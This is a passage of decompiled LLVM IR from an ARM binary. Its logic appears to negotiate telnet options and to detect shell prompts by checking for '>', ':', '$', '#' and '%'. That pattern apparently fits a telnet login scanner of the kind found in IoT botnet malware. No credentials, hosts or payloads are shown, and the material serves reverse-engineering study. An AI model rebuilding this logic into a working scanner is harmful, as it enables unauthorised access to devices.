  %v1_fb50 = call i32 @function_fcc0(i32 28)
  br i1 %v0_f704, label %dec_label_pc_fb4c, label %dec_label_pc_f714

dec_label_pc_f714:                                ; preds = %thread-pre-split124, %dec_label_pc_f934
  %storemerge = phi i32 [ %v1_f93c, %dec_label_pc_f934 ], [ %v1_fb50, %thread-pre-split124 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v0_f714 = load i32, i32* @r6, align 4
  %v1_f714 = inttoptr i32 %v0_f714 to i32*
  %v2_f714 = load i32, i32* %v1_f714, align 4
  store i32 %v2_f714, i32* %r3.global-to-local, align 4
  %v1_f718 = add i32 %v0_f714, 4
  %v2_f718 = inttoptr i32 %v1_f718 to i32*
  %v3_f718 = load i32, i32* %v2_f718, align 4
  store i32 %v3_f718, i32* %r0.global-to-local, align 4
  %v1_f71c = add i32 %v2_f714, 13
  %v2_f71c = inttoptr i32 %v1_f71c to i8*
  %v3_f71c = load i8, i8* %v2_f71c, align 1
  %v4_f71c = zext i8 %v3_f71c to i32
  store i32 %v4_f71c, i32* %r2.global-to-local, align 4
  %v1_f720 = add i32 %v2_f714, 4
  %v2_f720 = inttoptr i32 %v1_f720 to i32*
  %v3_f720 = load i32, i32* %v2_f720, align 4
  store i32 %v3_f720, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f728 = call i32 @function_11528(i32 %v3_f718, i32 %v3_f720, i32 %v4_f71c, i32 16384)
  store i32 %v4_f728, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f730 = load i32, i32* @r6, align 4
  %v1_f730 = add i32 %v0_f730, 4
  %v2_f730 = inttoptr i32 %v1_f730 to i32*
  %v3_f730 = load i32, i32* %v2_f730, align 4
  store i32 %v3_f730, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16214.187 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f73c = call i32 @function_11528(i32 %v3_f730, i32 ptrtoint ([3 x i8]* @global_var_16214.187 to i32), i32 2, i32 16384)
  store i32 %v4_f73c, i32* %r0.global-to-local, align 4
  store i32 5, i32* @r3, align 4
  %v1_f744 = load i32, i32* @r6, align 4
  %v2_f744 = add i32 %v1_f744, 12
  %v3_f744 = inttoptr i32 %v2_f744 to i32*
  store i32 5, i32* %v3_f744, align 4
  br label %dec_label_pc_f748

dec_label_pc_f748:                                ; preds = %dec_label_pc_f35c, %bb436, %dec_label_pc_f858, %dec_label_pc_f990, %dec_label_pc_f8fc, %dec_label_pc_f9d4, %dec_label_pc_f714
  %v0_f748 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f748 = icmp eq i32 %v0_f748, 0
  store i1 %v2_f748, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f748, label %dec_label_pc_ef30.loopexit, label %dec_label_pc_f0cc

dec_label_pc_f754:                                ; preds = %dec_label_pc_efb0
  %v1_f754 = add i32 %v0_efb0, 24
  %v2_f754 = inttoptr i32 %v1_f754 to i32*
  %v3_f754 = load i32, i32* %v2_f754, align 4
  store i32 %v3_f754, i32* %r2.global-to-local, align 4
  %v1_f758 = add i32 %v3_f754, -1
  store i32 %v1_f758, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f75c = icmp eq i32 %v1_f758, 0
  store i1 %v2_f75c, i1* %cpsr_z.global-to-local, align 1
  %tmp450 = icmp slt i32 %v1_f758, 1
  br i1 %tmp450, label %dec_label_pc_f7d0, label %dec_label_pc_f764

dec_label_pc_f764:                                ; preds = %dec_label_pc_f754
  %v2_f764 = add i32 %v1_f758, %v0_efb0
  store i32 %v2_f764, i32* %r3.global-to-local, align 4
  %v1_f768 = add i32 %v2_f764, 28
  %v2_f768 = inttoptr i32 %v1_f768 to i8*
  %v3_f768 = load i8, i8* %v2_f768, align 1
  %v4_f768 = zext i8 %v3_f768 to i32
  store i32 %v4_f768, i32* %r3.global-to-local, align 4
  %v2_f76c = icmp ugt i8 %v3_f768, 61
  store i1 %v2_f76c, i1* %cpsr_c.global-to-local, align 1
  %v7_f76c = icmp eq i8 %v3_f768, 62
  store i1 %v7_f76c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f76c, label %dec_label_pc_f8e8, label %bb451

bb451:                                            ; preds = %dec_label_pc_f764
  %v3_f770 = icmp ugt i8 %v3_f768, 57
  store i1 %v3_f770, i1* %cpsr_c.global-to-local, align 1
  %v8_f770 = icmp eq i8 %v3_f768, 58
  store i1 %v8_f770, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f770, label %dec_label_pc_f8e8, label %dec_label_pc_f778

dec_label_pc_f778:                                ; preds = %bb451
  %v2_f778 = icmp ugt i8 %v3_f768, 35
  store i1 %v2_f778, i1* %cpsr_c.global-to-local, align 1
  %v7_f778 = icmp eq i8 %v3_f768, 36
  store i1 %v7_f778, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f778, label %dec_label_pc_f8e8, label %dec_label_pc_f780

dec_label_pc_f780:                                ; preds = %dec_label_pc_f778
  %v2_f780 = icmp ugt i8 %v3_f768, 34
  store i1 %v2_f780, i1* %cpsr_c.global-to-local, align 1
  %v7_f780 = icmp eq i8 %v3_f768, 35
  store i1 %v7_f780, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f780, label %dec_label_pc_f8e8, label %dec_label_pc_f788

dec_label_pc_f788:                                ; preds = %dec_label_pc_f780
  %v2_f788 = icmp ugt i8 %v3_f768, 36
  store i1 %v2_f788, i1* %cpsr_c.global-to-local, align 1
  %v7_f788 = icmp eq i8 %v3_f768, 37
  store i1 %v7_f788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f788, label %dec_label_pc_f8e8, label %dec_label_pc_f7c8.preheader

dec_label_pc_f7c8.preheader:                      ; preds = %dec_label_pc_f788
  %v3_f78c = add i32 %v0_efb0, 28
  %v2_f790 = add i32 %v3_f78c, %v3_f754
  store i32 %v2_f790, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f7c8

dec_label_pc_f79c:                                ; preds = %dec_label_pc_f7c8
  %v1_f79c = add i32 %v0_f7c0, -2
  %v2_f79c = inttoptr i32 %v1_f79c to i8*
  %v3_f79c = load i8, i8* %v2_f79c, align 1
  %v4_f79c = zext i8 %v3_f79c to i32
  store i32 %v4_f79c, i32* %r2.global-to-local, align 4
  %v2_f7a0 = icmp ugt i8 %v3_f79c, 61
  store i1 %v2_f7a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f7a0 = icmp eq i8 %v3_f79c, 62
  store i1 %v7_f7a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7a0, label %dec_label_pc_f8e8, label %bb452

bb452:                                            ; preds = %dec_label_pc_f79c
  %v3_f7a4 = icmp ugt i8 %v3_f79c, 57
  store i1 %v3_f7a4, i1* %cpsr_c.global-to-local, align 1
  %v8_f7a4 = icmp eq i8 %v3_f79c, 58
  store i1 %v8_f7a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f7a4, label %dec_label_pc_f8e8, label %dec_label_pc_f7ac

dec_label_pc_f7ac:                                ; preds = %bb452
  %v2_f7ac = icmp ugt i8 %v3_f79c, 35
  store i1 %v2_f7ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f7ac = icmp eq i8 %v3_f79c, 36
  store i1 %v7_f7ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7ac, label %dec_label_pc_f8e8, label %dec_label_pc_f7b4

dec_label_pc_f7b4:                                ; preds = %dec_label_pc_f7ac
  %v2_f7b4 = icmp ugt i8 %v3_f79c, 34
  store i1 %v2_f7b4, i1* %cpsr_c.global-to-local, align 1
  %v7_f7b4 = icmp eq i8 %v3_f79c, 35
  store i1 %v7_f7b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7b4, label %dec_label_pc_f8e8, label %dec_label_pc_f7bc

dec_label_pc_f7bc:                                ; preds = %dec_label_pc_f7b4
  %v2_f7bc = icmp ugt i8 %v3_f79c, 36
  store i1 %v2_f7bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f7bc = icmp eq i8 %v3_f79c, 37
  store i1 %v7_f7bc, i1* %cpsr_z.global-to-local, align 1
  %v1_f7c0 = add i32 %v0_f7c0, -1
  store i32 %v1_f7c0, i32* %r3.global-to-local, align 4
  br i1 %v7_f7bc, label %dec_label_pc_f8e8, label %dec_label_pc_f7c8

dec_label_pc_f7c8:                                ; preds = %dec_label_pc_f7c8.preheader, %dec_label_pc_f7bc
  %v0_f7c0 = phi i32 [ %v2_f790, %dec_label_pc_f7c8.preheader ], [ %v1_f7c0, %dec_label_pc_f7bc ]
  %v0_f7c8 = phi i32 [ %v1_f758, %dec_label_pc_f7c8.preheader ], [ %v1_f7c8, %dec_label_pc_f7bc ]
  %v1_f7c8 = add i32 %v0_f7c8, -1
  store i32 %v1_f7c8, i32* %r1.global-to-local, align 4
  %v2_f7c8 = icmp ne i32 %v0_f7c8, 0
  store i1 %v2_f7c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7c8 = icmp eq i32 %v0_f7c8, 1
  store i1 %v7_f7c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7c8, label %dec_label_pc_f7d0, label %dec_label_pc_f79c

dec_label_pc_f7d0:                                ; preds = %dec_label_pc_f7c8, %dec_label_pc_f754
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_f7d4 = call i32 @function_fd60(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_f7dc = call i32 @function_fd60(i32 30)
  store i32 %v2_f7e4, i32* %r1.global-to-local, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v3_f7ec = call i32 @function_fc9c(i32 29, i32* nonnull %stack_var_-60)
  store i32 %v3_f7ec, i32* @r4, align 4
  store i32 %v2_f7e4, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_f800 = call i32 @function_fc9c(i32 30, i32* nonnull %stack_var_-60)
  %v3_f804 = load i32, i32* %stack_var_-60, align 4
  %sext = mul i32 %v3_f800, 16777216
  %v1_f808 = sdiv i32 %sext, 16777216
  store i32 %v1_f808, i32* @r5, align 4
  %v0_f80c = load i32, i32* @r4, align 4
  store i32 %v0_f80c, i32* %r2.global-to-local, align 4
  %v1_f810 = add i32 %v3_f804, -1
  store i32 %v1_f810, i32* %r3.global-to-local, align 4
  %v0_f814 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f814, i32* %r0.global-to-local, align 4
  %v0_f818 = load i32, i32* @r6, align 4
  %v1_f818 = add i32 %v0_f818, 24
  %v2_f818 = inttoptr i32 %v1_f818 to i32*
  %v3_f818 = load i32, i32* %v2_f818, align 4
  store i32 %v3_f818, i32* %r1.global-to-local, align 4
  %v4_f81c = call i32 @function_103d0(i32 %v0_f814, i32 %v3_f818, i32 %v0_f80c, i32 %v1_f810)
  store i32 %v4_f81c, i32* %r0.global-to-local, align 4
  %v2_f820 = icmp eq i32 %v4_f81c, -1
  store i1 %v2_f820, i1* %cpsr_c.global-to-local, align 1
  %v7_f820 = icmp eq i32 %v4_f81c, -1
  store i1 %v7_f820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f820, label %dec_label_pc_f830, label %dec_label_pc_f858

dec_label_pc_f830:                                ; preds = %dec_label_pc_f7d0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_f830 = load i32, i32* %stack_var_-60, align 4
  %v0_f834 = load i32, i32* @r5, align 4
  store i32 %v0_f834, i32* %r2.global-to-local, align 4
  %v1_f838 = add i32 %v3_f830, -1
  store i32 %v1_f838, i32* %r3.global-to-local, align 4
  %v0_f83c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f83c, i32* %r0.global-to-local, align 4
  %v0_f840 = load i32, i32* @r6, align 4
  %v1_f840 = add i32 %v0_f840, 24
  %v2_f840 = inttoptr i32 %v1_f840 to i32*
  %v3_f840 = load i32, i32* %v2_f840, align 4
  store i32 %v3_f840, i32* %r1.global-to-local, align 4
  %v4_f844 = call i32 @function_103d0(i32 %v0_f83c, i32 %v3_f840, i32 %v0_f834, i32 %v1_f838)
  store i32 %v4_f844, i32* %r0.global-to-local, align 4
  %v1_f848 = add i32 %v4_f844, 1
  store i32 %v1_f848, i32* @r7, align 4
  %v2_f848 = icmp eq i32 %v4_f844, -1
  store i1 %v2_f848, i1* %cpsr_c.global-to-local, align 1
  %v7_f848 = icmp eq i32 %v1_f848, 0
  store i1 %v7_f848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f848, label %dec_label_pc_fb0c, label %dec_label_pc_f858

dec_label_pc_f858:                                ; preds = %dec_label_pc_f830, %dec_label_pc_f7d0
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_f85c = call i32 @function_fcc0(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_f864 = call i32 @function_fcc0(i32 30)
  store i32 %v1_f864, i32* %r0.global-to-local, align 4
  %v0_f868 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f868 = icmp eq i32 %v0_f868, 0
  store i1 %v2_f868, i1* %cpsr_z.global-to-local, align 1
  %tmp453 = icmp slt i32 %v0_f868, 1
  br i1 %tmp453, label %dec_label_pc_f748, label %dec_label_pc_f8fc

dec_label_pc_f874:                                ; preds = %dec_label_pc_f2e0
  store i32 ptrtoint (i32* @global_var_16220.189 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_f878, i32* @r0, align 4
  %v0_f890 = call i32 @function_11300()
  store i32 9, i32* @r2, align 4
  store i32 %v2_f88c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16217.191 to i32), i32* @r1, align 4
  %v0_f8a0 = call i32 @function_11300()
  store i32 %v0_f8a0, i32* %r0.global-to-local, align 4
  %v0_f8a4 = load i32, i32* @r6, align 4
  %v1_f8a4 = add i32 %v0_f8a4, 24
  %v2_f8a4 = inttoptr i32 %v1_f8a4 to i32*
  %v3_f8a4 = load i32, i32* %v2_f8a4, align 4
  %v0_f8a8 = load i32, i32* @r4, align 4
  %v1_f8a8 = add i32 %v0_f8a8, 2
  store i32 %v1_f8a8, i32* %r2.global-to-local, align 4
  %v0_f8ac = load i32, i32* %sb.global-to-local, align 4
  %v2_f8ac = add i32 %v0_f8ac, %v3_f8a4
  store i32 %v2_f8ac, i32* @r3, align 4
  %v3_f8b0 = icmp uge i32 %v2_f8ac, %v1_f8a8
  store i1 %v3_f8b0, i1* %cpsr_c.global-to-local, align 1
  %v9_f8b0 = icmp eq i32 %v2_f8ac, %v1_f8a8
  store i1 %v9_f8b0, i1* %cpsr_z.global-to-local, align 1
  %v2_f8b4 = xor i1 %v3_f8b0, true
  %v3_f8b4 = or i1 %v9_f8b0, %v2_f8b4
  br i1 %v3_f8b4, label %dec_label_pc_f874.dec_label_pc_f35c.loopexit_crit_edge, label %dec_label_pc_f8b8

dec_label_pc_f874.dec_label_pc_f35c.loopexit_crit_edge: ; preds = %dec_label_pc_f874
  %v0_f35c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_f35c

dec_label_pc_f8b8:                                ; preds = %dec_label_pc_f874
  %v2_f8b8 = inttoptr i32 %v1_f8a8 to i8*
  %v3_f8b8 = load i8, i8* %v2_f8b8, align 1
  %v4_f8b8 = zext i8 %v3_f8b8 to i32
  store i32 %v4_f8b8, i32* %r3.global-to-local, align 4
  %v2_f8bc = icmp ugt i8 %v3_f8b8, 30
  store i1 %v2_f8bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f8bc = icmp eq i8 %v3_f8b8, 31
  store i1 %v7_f8bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8bc, label %dec_label_pc_f9ec, label %dec_label_pc_f8c4

dec_label_pc_f8c4:                                ; preds = %dec_label_pc_f8b8
  %v1_f8c4 = inttoptr i32 %v0_f8a8 to i8*
  %v2_f8c4 = load i8, i8* %v1_f8c4, align 1
  %v3_f8c4 = zext i8 %v2_f8c4 to i32
  store i32 %v3_f8c4, i32* %r3.global-to-local, align 4
  %v2_f8c8 = icmp ugt i8 %v2_f8c4, -4
  store i1 %v2_f8c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f8c8 = icmp eq i8 %v2_f8c4, -3
  store i1 %v7_f8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8c8, label %.thread138, label %dec_label_pc_f8d8

.thread138:                                       ; preds = %dec_label_pc_f8c4
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f8c4, align 1
  %v0_f8d4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f8d4.pr.pr, label %dec_label_pc_f2f4, label %.thread138.dec_label_pc_f8d8thread-pre-split_crit_edge

.thread138.dec_label_pc_f8d8thread-pre-split_crit_edge: ; preds = %.thread138
  %v0_f8d8.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f8d8

dec_label_pc_f8d8:                                ; preds = %dec_label_pc_f8c4, %.thread138.dec_label_pc_f8d8thread-pre-split_crit_edge
  %v0_f8d8.pr = phi i32 [ %v0_f8d8.pr.pre, %.thread138.dec_label_pc_f8d8thread-pre-split_crit_edge ], [ %v3_f8c4, %dec_label_pc_f8c4 ]
  %v2_f8d8 = icmp ugt i32 %v0_f8d8.pr, 250
  store i1 %v2_f8d8, i1* %cpsr_c.global-to-local, align 1
  %v7_f8d8 = icmp eq i32 %v0_f8d8.pr, 251
  store i1 %v7_f8d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8d8, label %bb454, label %dec_label_pc_f2f4

bb454:                                            ; preds = %dec_label_pc_f8d8
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f8e0 = load i32, i32* @r4, align 4
  %v4_f8e0 = inttoptr i32 %v3_f8e0 to i8*
  store i8 -3, i8* %v4_f8e0, align 1
  br label %dec_label_pc_f2f4

dec_label_pc_f8e8:                                ; preds = %dec_label_pc_f79c, %dec_label_pc_f7bc, %dec_label_pc_f7b4, %dec_label_pc_f7ac, %bb452, %dec_label_pc_f788, %dec_label_pc_f764, %dec_label_pc_f780, %dec_label_pc_f778, %bb451
  %v0_f8ec = phi i32 [ %v1_f758, %dec_label_pc_f788 ], [ %v1_f758, %dec_label_pc_f764 ], [ %v1_f758, %dec_label_pc_f780 ], [ %v1_f758, %dec_label_pc_f778 ], [ %v1_f758, %bb451 ], [ %v1_f7c8, %bb452 ], [ %v1_f7c8, %dec_label_pc_f7ac ], [ %v1_f7c8, %dec_label_pc_f7b4 ], [ %v1_f7c8, %dec_label_pc_f7bc ], [ %v1_f7c8, %dec_label_pc_f79c ]
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_f8ec = add i32 %v0_f8ec, 1
  store i32 %v1_f8ec, i32* @r7, align 4
  %v1_f8f0 = call i32 @function_fcc0(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_f8f8 = call i32 @function_fcc0(i32 30)
  store i32 %v1_f8f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f8fc

dec_label_pc_f8fc:                                ; preds = %dec_label_pc_f858, %dec_label_pc_f8e8
  %v0_f8fc = load i32, i32* @r6, align 4
  %v1_f8fc = inttoptr i32 %v0_f8fc to i32*
  %v2_f8fc = load i32, i32* %v1_f8fc, align 4
  store i32 %v2_f8fc, i32* %r3.global-to-local, align 4
  %v1_f900 = add i32 %v0_f8fc, 4
  %v2_f900 = inttoptr i32 %v1_f900 to i32*
  %v3_f900 = load i32, i32* %v2_f900, align 4
  store i32 %v3_f900, i32* %r0.global-to-local, align 4
  %v1_f904 = add i32 %v2_f8fc, 12
  %v2_f904 = inttoptr i32 %v1_f904 to i8*
  %v3_f904 = load i8, i8* %v2_f904, align 1
  %v4_f904 = zext i8 %v3_f904 to i32
  store i32 %v4_f904, i32* %r2.global-to-local, align 4
  %v1_f908 = inttoptr i32 %v2_f8fc to i32*
  %v2_f908 = load i32, i32* %v1_f908, align 4
  store i32 %v2_f908, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f910 = call i32 @function_11528(i32 %v3_f900, i32 %v2_f908, i32 %v4_f904, i32 16384)
  store i32 %v4_f910, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f918 = load i32, i32* @r6, align 4
  %v1_f918 = add i32 %v0_f918, 4
  %v2_f918 = inttoptr i32 %v1_f918 to i32*
  %v3_f918 = load i32, i32* %v2_f918, align 4
  store i32 %v3_f918, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16214.187 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f924 = call i32 @function_11528(i32 %v3_f918, i32 ptrtoint ([3 x i8]* @global_var_16214.187 to i32), i32 2, i32 16384)
  store i32 %v4_f924, i32* %r0.global-to-local, align 4
  store i32 4, i32* @r3, align 4
  %v1_f92c = load i32, i32* @r6, align 4
  %v2_f92c = add i32 %v1_f92c, 12
  %v3_f92c = inttoptr i32 %v2_f92c to i32*
  store i32 4, i32* %v3_f92c, align 4
  br label %dec_label_pc_f748

dec_label_pc_f934:                                ; preds = %dec_label_pc_f6a0, %dec_label_pc_f6b8, %dec_label_pc_f6b0, %bb448, %dec_label_pc_f68c, %dec_label_pc_f670, %dec_label_pc_f684, %bb447
  %v0_f938 = phi i32 [ %v1_f664, %dec_label_pc_f68c ], [ %v1_f664, %dec_label_pc_f670 ], [ %v1_f664, %dec_label_pc_f684 ], [ %v1_f664, %bb447 ], [ %v1_f6c4, %bb448 ], [ %v1_f6c4, %dec_label_pc_f6b0 ], [ %v1_f6c4, %dec_label_pc_f6b8 ], [ %v1_f6c4, %dec_label_pc_f6a0 ]
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_f938 = add i32 %v0_f938, 1
  store i32 %v1_f938, i32* @r7, align 4
  %v1_f93c = call i32 @function_fcc0(i32 28)
  br label %dec_label_pc_f714

dec_label_pc_f944:                                ; preds = %dec_label_pc_f050
  store i32 11, i32* %r0.global-to-local, align 4
  %v1_f950 = call i32 @function_fd60(i32 11)
  store i32 %v2_f7e4, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v3_f960 = call i32 @function_fc9c(i32 11, i32* nonnull %stack_var_-60)
  store i32 %v3_f960, i32* %r0.global-to-local, align 4
  %v3_f964 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f960, i32* %r2.global-to-local, align 4
  %v1_f96c = add i32 %v3_f964, -1
  store i32 %v1_f96c, i32* %r3.global-to-local, align 4
  %v0_f970 = load i32, i32* @r6, align 4
  %v1_f970 = add i32 %v0_f970, 24
  %v2_f970 = inttoptr i32 %v1_f970 to i32*
  %v3_f970 = load i32, i32* %v2_f970, align 4
  store i32 %v3_f970, i32* %r1.global-to-local, align 4
  %v0_f974 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f974, i32* %r0.global-to-local, align 4
  %v4_f978 = call i32 @function_103d0(i32 %v0_f974, i32 %v3_f970, i32 %v3_f960, i32 %v1_f96c)
  store i32 %v4_f978, i32* @r7, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v1_f984 = call i32 @function_fcc0(i32 11)
  store i32 %v1_f984, i32* @r0, align 4
  %v0_f988 = load i32, i32* @r7, align 4
  %v2_f988 = icmp eq i32 %v0_f988, -1
  store i1 %v2_f988, i1* %cpsr_c.global-to-local, align 1
  %v7_f988 = icmp eq i32 %v0_f988, -1
  store i1 %v7_f988, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f988, label %dec_label_pc_ef30.loopexit, label %dec_label_pc_f990

dec_label_pc_f990:                                ; preds = %dec_label_pc_f944
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f990 = icmp eq i32 %v0_f988, 0
  store i1 %v2_f990, i1* %cpsr_z.global-to-local, align 1
  %tmp455 = icmp slt i32 %v0_f988, 1
  br i1 %tmp455, label %dec_label_pc_f748, label %dec_label_pc_f998

dec_label_pc_f998:                                ; preds = %dec_label_pc_f990
  %v0_f998 = load i32, i32* @r6, align 4
  %v1_f998 = add i32 %v0_f998, 20
  %v2_f998 = inttoptr i32 %v1_f998 to i16*
  %v3_f998 = load i16, i16* %v2_f998, align 2
  %v4_f998 = zext i16 %v3_f998 to i32
  store i32 %v4_f998, i32* %r3.global-to-local, align 4
  %v1_f99c = add i32 %v0_f998, 16
  %v2_f99c = inttoptr i32 %v1_f99c to i32*
  %v3_f99c = load i32, i32* %v2_f99c, align 4
  store i32 %v3_f99c, i32* %r2.global-to-local, align 4
  store i32 %v2_f9a0, i32* @ip, align 4
  store i32 %v4_f998, i32* %stack_var_-42, align 4
  store i32 %v3_f99c, i32* %stack_var_-60, align 4
  %v1_f9ac = inttoptr i32 %v0_f998 to i32*
  %v2_f9ac = load i32, i32* %v1_f9ac, align 4
  store i32 %v2_f9ac, i32* @r8, align 4
  %v0_f9b0 = call i32 @function_10ac8()
  store i32 %v0_f9b0, i32* %r0.global-to-local, align 4
  %v7_f9b4 = icmp eq i32 %v0_f9b0, -1
  %.465 = zext i1 %v7_f9b4 to i32
  store i32 %.465, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9c0 = icmp eq i32 %v0_f9b0, 0
  store i1 %v2_f9c0, i1* %cpsr_z.global-to-local, align 1
  %tmp458 = icmp slt i32 %v0_f9b0, 1
  br i1 %tmp458, label %bb459, label %.thread144

.thread144:                                       ; preds = %dec_label_pc_f998
  store i32 1, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f9d4

bb459:                                            ; preds = %dec_label_pc_f998
  store i32 %.465, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9cc = icmp eq i1 %v7_f9b4, false
  store i1 %v2_f9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f9cc, label %dec_label_pc_fb5c, label %dec_label_pc_f9d4

dec_label_pc_f9d4:                                ; preds = %.thread144, %bb459
  %v0_f9d4 = load i32, i32* @r6, align 4
  %v1_f9d4 = add i32 %v0_f9d4, 4
  %v2_f9d4 = inttoptr i32 %v1_f9d4 to i32*
  %v3_f9d4 = load i32, i32* %v2_f9d4, align 4
  store i32 %v3_f9d4, i32* %r0.global-to-local, align 4
  %v1_f9d8 = call i32 @function_10dd8(i32 %v3_f9d4)
  store i32 %v1_f9d8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_f9e0 = load i32, i32* @r4, align 4
  %v1_f9e0 = load i32, i32* @r6, align 4
  %v2_f9e0 = add i32 %v1_f9e0, 4
  %v3_f9e0 = inttoptr i32 %v2_f9e0 to i32*
  store i32 %v0_f9e0, i32* %v3_f9e0, align 4
  %v0_f9e4 = load i32, i32* @r3, align 4
  %v1_f9e4 = load i32, i32* @r6, align 4
  %v2_f9e4 = add i32 %v1_f9e4, 12
  %v3_f9e4 = inttoptr i32 %v2_f9e4 to i32*
  store i32 %v0_f9e4, i32* %v3_f9e4, align 4
  br label %dec_label_pc_f748

dec_label_pc_f9ec:                                ; preds = %dec_label_pc_f8b8
  store i32 %v2_f878, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_f9f8 = add i32 %v0_f8a4, 4
  %v2_f9f8 = inttoptr i32 %v1_f9f8 to i32*
  %v3_f9f8 = load i32, i32* %v2_f9f8, align 4
  store i32 %v3_f9f8, i32* %r0.global-to-local, align 4
  %v4_f9fc = call i32 @function_11528(i32 %v3_f9f8, i32 %v2_f878, i32 3, i32 16384)
  store i32 %v4_f9fc, i32* %r0.global-to-local, align 4
  %v0_fa00 = load i32, i32* @r6, align 4
  %v1_fa00 = add i32 %v0_fa00, 4
  %v2_fa00 = inttoptr i32 %v1_fa00 to i32*
  %v3_fa00 = load i32, i32* %v2_fa00, align 4
  store i32 %v3_fa00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f340

dec_label_pc_fa10:                                ; preds = %dec_label_pc_ef3c
  store i32 %.pre282, i32* @r0, align 4
  %v1_fa18 = add i32 %v0_fa10, 92
  store i32 %v1_fa18, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_fa20 = call i32 @function_112f0(i32 %.pre282, i32 %v1_fa18, i32 192)
  store i32 %v3_fa20, i32* %r0.global-to-local, align 4
  %v0_fa24 = load i32, i32* @r6, align 4
  %v1_fa24 = add i32 %v0_fa24, 24
  %v2_fa24 = inttoptr i32 %v1_fa24 to i32*
  %v3_fa24 = load i32, i32* %v2_fa24, align 4
  %v1_fa28 = add i32 %v3_fa24, -64
  store i32 %v1_fa28, i32* %r3.global-to-local, align 4
  store i32 %v1_fa28, i32* %v2_fa24, align 4
  br label %dec_label_pc_ef4c

dec_label_pc_fa34:                                ; preds = %dec_label_pc_f08c
  %v0_fa34 = load i32, i32* @r6, align 4
  store i32 %v0_fa34, i32* @r0, align 4
  %v0_fa38 = call i32 @function_e324()
  store i32 %v0_fa38, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f0c8

